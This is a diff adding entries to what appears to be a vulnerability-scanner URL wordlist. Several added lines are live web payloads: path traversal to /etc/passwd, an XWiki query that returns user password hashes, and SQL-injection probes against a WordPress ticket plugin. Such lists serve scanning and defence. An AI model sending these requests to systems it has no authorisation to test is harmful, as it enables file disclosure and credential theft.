@@ -2332,3 +2332,14 @@
 /wp-content/plugins/wpdm-premium-packages/readme.txt
 /api/app-icons/..%2F..%2F..%2F..%2Fetc%2Fpasswd
 /wp-content/plugins/the-events-calendar/readme.txt
+/index.php?option=com_simplemembership&task=checkLoginPass&format=raw&login=
+/apps/richdocumentscode/proxy.php?nuclei_detect
+/apps/richdocumentscode_arm64/proxy.php?nuclei_detect
+/xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/xwiki/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
+/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
+/wp-content/plugins/wp-ticket/readme.txt
+/?s=zzz%25%27%20OR%20%28post_type%3D%27emd_ticket%27%29%20OR%20%27x
+/?s=zzz%25%27%20AND%20%28post_type%3D%27emd_ticket%27%29%20AND%20%27x
+/transmission/rpc
